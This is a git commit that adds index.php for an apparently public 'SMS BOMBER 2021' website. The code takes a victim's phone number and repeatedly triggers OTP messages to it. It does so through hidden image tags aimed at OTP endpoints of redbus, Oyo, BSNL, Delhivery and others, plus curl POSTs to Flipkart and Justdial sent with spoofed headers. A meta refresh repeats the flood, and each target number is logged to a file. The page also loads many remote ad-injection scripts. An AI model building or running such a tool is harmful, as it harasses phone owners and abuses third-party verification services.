38f0f4f944af15dffc24c298c6340e9053f1fc95
Ashish Sasatte <83086435+Ashish07s@users.noreply.github.com>
2021-07-28 21:46:13 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,421 @@
+<?php 
+error_reporting(0);
+$tel_no=$_GET['phone'];
+$name=$_GET['name'];
+$c=$_GET['c']?$_GET['c']:0; 
+$c++;
+$count=$_GET['counts'];
+?>
+<!DOCTYPE html> 
+
+<html>
+<head>
+<meta name="msvalidate.01" content="53E9AB06DBBBAF169D3881EA0524AB97" />
+<meta name="ahrefs-site-verification" content="64e2cc4827dd12fbe52b618739102620676e13eea1e742419c986f6b047e2845">
+<link rel="icon" sizes="32x32" href="/favicon_io/favicon-32x32.png">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-wEmeIV1mKuiNpC+IOBjI7aAzPcEZeedi5yW5f2yOq55WWLwNGmvvx4Um1vskeMj0" crossorigin="anonymous">
+<script type='text/javascript'>
+(function(d) {
+	var params = { bvpushsubid: 2058140, cb: (new Date()).getTime() };
+	var qs = Object.keys(params).reduce(function(a, k){ a.push(k + '=' + encodeURIComponent(params[k])); return a},[]).join(String.fromCharCode(38));
+	var s = d.createElement('script'); s.type='text/javascript';s.async=true;
+	var p = 'https:' == document.location.protocol ? 'https' : 'http';
+	s.src = p + "://cdn.hyperpromote.com/bidvertiser/tags/activejs/bdpush.js?" + qs;
+	d.getElementsByTagName('body').item(0).appendChild(s);
+})(document);
+</script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-p34f1UUtsS3wqzfto5wAAmdvj+osOnFyQFpp4Ua3gs/ZVWx6oOypYoCJhGGScy+8" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.min.js" integrity="sha384-lpyLfhYuitXl2zRZ5Bn2fqnhNAKOAaM/0Kr9laMspuaMiZfGmfwRNFh8HlMy49eQ" crossorigin="anonymous"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+<nav class="navbar navbar-expand-sm navbar-light bg-light">
+  <a class="navbar-brand" href="images/ASDevlop.png">ASDevlp</a>
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarSupportedContent">
+    <ul class="navbar-nav mr-auto">
+      <li class="nav-item active">
+        <a class="nav-link" href="index.php">Home <span class="sr-only">(current)</span></a>
+      </li>
+
+      <li class="nav-item dropdown">
+        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+          More Tools
+        </a>
+        <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+          <a class="dropdown-item" href="instagram/index.php">Instagram </a>
+          <a class="dropdown-item" href="ytbdwn/index.php">Youtube Downloads</a>
+          <div class="dropdown-divider"></div>
+          <a class="dropdown-item" href="successpage/success.html">Success?</a>
+          <a class="dropdown-item" href="coming-soon.html">Upcoming Features</a>
+        </div>
+      </li>
+      <li class="nav-item active">
+      </li>
+    </ul>
+    <form class="form-inline my-2 my-lg-0">
+    <a class="nav-link" href="blog.html">Blog <span class="sr-only">(current)</span></a>
+    <a class="nav-link" href="AboutUs.html">About Us <span class="sr-only"></span></a>
+    <a class="nav-link" href="login-signup/home.html">Sign Up <span class="sr-only"></span></a>
+      <input class="form-control mr-sm-2" type="search" placeholder="Search" aria-label="Search">
+      <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
+    </form>
+  </div>
+</nav>
+
+</body>
+</html>
+
+<html lang="en">
+<head>
+	<title>SMS BOMBER 2021 | Best Online Tools | ASDevlp Tool </title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--===============================================================================================-->
+	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="css/util.css">
+	<link rel="stylesheet" type="text/css" href="css/main.css">
+<!--===============================================================================================-->
+</head>
+<body>
+	<div class="container-contact100">
+
+		<div class="wrap-contact100">
+		<!--<div id="vansh" style="text-align: right"><img src="img.jpg" width="300" /></div>-->
+			<form class="contact100-form validate-form" action="index.php" method="GET">
+				<span class="contact100-form-title">
+						<?php
+ if($tel_no){
+ 	if($tel_no==9145726291||$tel_no==9145726291)
+ 	{
+ 	echo "<marquee direction=up><h1>Sorry This Number is highly Secure!! :)</h1></marquee><br>";
+ 	}
+ 	else
+	{
+	echo "<meta http-equiv=refresh content='3; url=index.php?phone={$tel_no}&amp;c={$c}'>";
+	}	
+}
+?>
+					SMS BOMBER 2021 - START BOMBING
+          <script type="text/javascript">
+		atOptions = {
+			'key' : 'b39e5ff2bb4e62fee391ad2750d83187',
+			'format' : 'iframe',
+			'height' : 50,
+			'width' : 320,
+			'params' : {}
+		};
+		document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://auditioningouncesufficiently.com/b39e5ff2bb4e62fee391ad2750d83187/invoke.js"></scr' + 'ipt>');
+	</script>
+
+				<div class="wrap-input100 validate-input"  style="display: none;" data-validate="Please enter your name">
+					<input class="input100" type="text" name="counts" placeholder="Full Name" value=1>
+					<span class="focus-input100" ></span>
+				</div>
+				<div class="wrap-input100 validate-input" data-validate = "Please enter your phone">
+					<input class="input100" type="text" name="phone" placeholder="Phone">
+					<span class="focus-input100"></span>
+				</div>
+        <div class="wrap-input100 validate-input" data-validate="Please enter your name">
+					<input class="input100" type="text" name="name" placeholder="Enter Count">
+					<span class="focus-input100" required=''></span>
+				</div>
+				<div class="container-contact100-form-btn">
+					<button class="contact100-form-btn">
+						<span>
+							<i class="fa fa-paper-plane-o m-r-6" aria-hidden="true"></i>
+							Send
+						</span>
+					</button>
+				</div>
+				<span class="contact100-form-title">
+					<br>
+					<br>
+         
+  <div class="col">
+    <div class="card">
+      <img src="images/12.png" class="card-img-top" alt="...">
+      <div class="card-body">
+        <h5 class="card-title">Get Instant Followers</h5>
+        <p class="card-text">Get 100% Free Instagram Followers Instantly.</p>
+		<a type="button" class="btn btn-info" href="insta_followers/index.php" >Get Followers </a>         
+      </div>
+    </div>
+  </div>
+<h> Thank You so much <h>
+			</form>
+
+		</div>
+		
+	</div>
+
+	<div id="dropDownSelect1"></div>
+<!--===============================================================================================-->
+	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/animsition/js/animsition.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/bootstrap/js/popper.js"></script>
+	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/select2/select2.min.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/daterangepicker/moment.min.js"></script>
+	<script src="vendor/daterangepicker/daterangepicker.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/countdowntime/countdowntime.js"></script>
+<!--===============================================================================================-->
+	<script src="js/main.js"></script>
+<?php
+if($count==1&&$tel_no!=769604)
+{
+$n="===========================================================";
+$name = "\n Name : ".$name.PHP_EOL;
+$mobno = "\n Number : ".$tel_no.PHP_EOL;
+$file = fopen('list.txt', 'a'); //open a file
+ $line = " " .$n. PHP_EOL; 
+ fwrite($file,$line);
+ fwrite($file,$name);
+ fwrite($file,$mobno);
+ fwrite($file,$line);
+ $count++;
+}?> 
+<?php if($tel_no==9145726291||$tel_no==9145726291)
+{
+echo "<script type='text/javascript'>alert('Not Send This Is Highly Secure Number');</script>";
+$tel_no=1;
+}?>
+<?php
+ if($tel_no){
+?>
+<!--API FOR SMS-->
+<div style='display:none'>
+
+<img src='https://m.redbus.in/api/sendOtp?number=<?php echo $tel_no;?>&cc=91' alt=''/>
+<img src= 'https://www.nearbuy.com/api/user/otp/send/<?php echo $tel_no;?>?sendOnlyIfCustomerExists=false&mode=sms' alt=''/>
+<img src= 'https://mapi.indiamart.com/wservce/users/OTPverification/?token=imobile%4015061981&mobile_num=<?php echo $tel_no;?>&modid=DIR&user_mobile_country_code=91&flag=OTPGen&user_ip=21.91.21.102&user_country=IN&process=OTP_JoinFreeForm_Desktop&user_updatedusing=Join+Free+Form+Desktop' alt=''/>
+<img src= 'http://www.moneycontrol.com/markets_on_mobile/index.php?mobile=<?php echo $tel_no;?>&id=1' alt=''/>
+<img src='https://www.loot4hub.in/SCRIPT/public_html/call.php?number=<?php echo $tel_no;?>'/>
+<img src='https://www.oyorooms.com/api/pwa/generateotp?phone=<?php echo $tel_no;?>&country_code=%2B91&nod=4'/>
+<img src='https://www.magicbricks.com/bricks/get-app-resend-Globle-Navigation.html?data=<?php echo $tel_no;?>&data1=50&data2=Magicbricks_Ap'/>
+<img src='https://portal2.bsnl.in/myportal/validatemobile.do?mobile=<?php echo $tel_no;?>'/>
+<img src='https://direct.delhivery.com/order/generate-otp?phoneNo=<?php echo $tel_no;?>'/>
+
+<?php 
+
+
+function flipkart($mobile,$countrycode){
+   $curl = curl_init();
+   curl_setopt($curl, CURLOPT_URL, "https://www.flipkart.com/api/5/user/otp/generate");
+   curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
+   curl_setopt($curl, CURLOPT_POSTFIELDS,"loginId=+".$countrycode."".$mobile."");
+   curl_setopt($curl, CURLOPT_TIMEOUT, 2);
+   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
+		'X-user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36 FKUA/website/41/website/Desktop'
+	)); 
+   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
+   curl_exec($curl);
+   curl_close($curl);
+}
+function justdial($mobile){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://www.justdial.com/functions/whatsappverification.php');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_TIMEOUT, 2);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, "mob=".$mobile."&vcode=&rsend=0&name=Pisyah");
+    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+    
+    $headers = array();
+    $headers[] = 'Authority: www.justdial.com';
+    $headers[] = 'Accept: /';
+    $headers[] = 'Sec-Fetch-Dest: empty';
+    $headers[] = 'X-Requested-With: XMLHttpRequest';
+    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36';
+    $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
+    $headers[] = 'Origin: https://www.justdial.com';
+    $headers[] = 'Referer: https://www.justdial.com/Mumbai/268/Baby-Care_fil';
+    $headers[] = 'Accept-Language: en-US,en;q=0.9';
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    curl_exec($ch);
+    curl_close($ch);
+}
+flipkart($tel_no, "91");
+justdial($tel_no);
+?>
+ </body>
+
+</html> //here html ends
+<!--API CLOSE FOR SMS-->
+<?php
+	}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+body {font-family: "Lato", sans-serif}
+.mySlides {display: none}
+</style>
+<body>
+<!-- Page content -->
+<div class="w3-content" style="max-width:2000px;margin-top:46px">
+  <!-- The Band Section -->
+  <div class="w3-container w3-content w3-center w3-padding-64" style="max-width:800px" id="band">
+    <h2 class="w3-wide">SMS BOMBER 2021</h2>
+    <p class="w3-opacity"><i>We love This</i></p>
+    <h2> Awesome Website Where You Can Find The Best Free Online Tools.<h2>
+     <p class="w3-opacity"> <i> We at SMS Bomber Tools create Free Online Tools which are used by millions of users around the world.</i></p>
+  </div>
+  <!-- The Tour Section -->
+  <div class="w3-black" id="tour">
+    <div class="w3-container w3-content w3-padding-64" style="max-width:800px">
+    
+    <script type="text/javascript">
+	atOptions = {
+		'key' : '8d5750b04df93a59c503a3a5cce93c4d',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://auditioningouncesufficiently.com/8d5750b04df93a59c503a3a5cce93c4d/invoke.js"></scr' + 'ipt>');
+</script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '8d5750b04df93a59c503a3a5cce93c4d',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://auditioningouncesufficiently.com/8d5750b04df93a59c503a3a5cce93c4d/invoke.js"></scr' + 'ipt>');
+</script>
+
+
+<script type="text/javascript">
+	atOptions = {
+		'key' : '8d5750b04df93a59c503a3a5cce93c4d',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://auditioningouncesufficiently.com/8d5750b04df93a59c503a3a5cce93c4d/invoke.js"></scr' + 'ipt>');
+</script>
+<script type="text/javascript">
+	atOptions = {
+		'key' : '8d5750b04df93a59c503a3a5cce93c4d',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://auditioningouncesufficiently.com/8d5750b04df93a59c503a3a5cce93c4d/invoke.js"></scr' + 'ipt>');
+</script>
+
+	     </div>
+        </div>
+
+<!-- The Contact Section -->
+  <div class="w3-container w3-content w3-padding-64" style="max-width:800px" id="contact">
+    <h2 class="w3-wide w3-center">CONTACT</h2>
+    <p class="w3-opacity w3-center"><i>User? Drop a note!</i></p>
+    <div class="w3-row w3-padding-32">
+      <div class="w3-col m6 w3-large w3-margin-bottom">
+        <i class="fa fa-map-marker" style="width:30px"></i> Maharashtra, India<br>
+        <i class="fa fa-phone" style="width:30px"></i> Phone: ________<br>
+        <i class="fa fa-envelope" style="width:30px"> </i> Email: asnehdevlptool@gmail.com <br>
+      </div>
+      <div class="w3-col m6">
+        <form action="/action_page.php" target="_blank">
+          <div class="w3-row-padding" style="margin:0 -16px 8px -16px">
+            <div class="w3-half">
+              <input class="w3-input w3-border" type="text" placeholder="Name" required name="Name">
+            </div>
+            <div class="w3-half">
+              <input class="w3-input w3-border" type="text" placeholder="Email" required name="Email">
+            </div>
+          </div>
+          <input class="w3-input w3-border" type="text" placeholder="Message" required name="Message">
+          <button class="w3-button w3-black w3-section w3-right" type="submit">SEND</button>
+        </form>
+	</div>
+    </div>
+  </div>
+  
+<!-- End Page Content -->
+</div>
+
+<div class="container my-4">  
+
+<li class="nav-item">        
+        <a class="nav-link" href="index.php">Home<span class="sr-only">(current)</span></a>
+      </li>
+<li class="nav-item">        
+        <a class="nav-link" href="tnc.html">Terms & Conditions <span class="sr-only">(current)</span></a>
+      </li>
+      <li class="nav-item">        
+        <a class="nav-link" href="privacy-policy.html">Privacy & Policy <span class="sr-only">(current)</span></a>
+      </li>
+      <a class="nav-link" href="contactus.html">Contact Us <span class="sr-only"></span></a>
+     
+  
+
+      
+  
+<hr class="mt-5">
+<script type="text/javascript">
+	atOptions = {
+		'key' : '771e7ff42a37c1843212e38cb774086e',
+		'format' : 'iframe',
+		'height' : 60,
+		'width' : 468,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://auditioningouncesufficiently.com/771e7ff42a37c1843212e38cb774086e/invoke.js"></scr' + 'ipt>');
+</script>
+
+
+<!-- Copyright -->
+<div class="footer-copyright text-center py-3">© 2021 Copyright:
+<a href="https://smsbomber21.online/"> smsbomber21.online </a>
+</div>
+<!-- Copyright -->
+
+</footer>
+<!-- Footer -->
+
+</div>
+</body>
+</html>
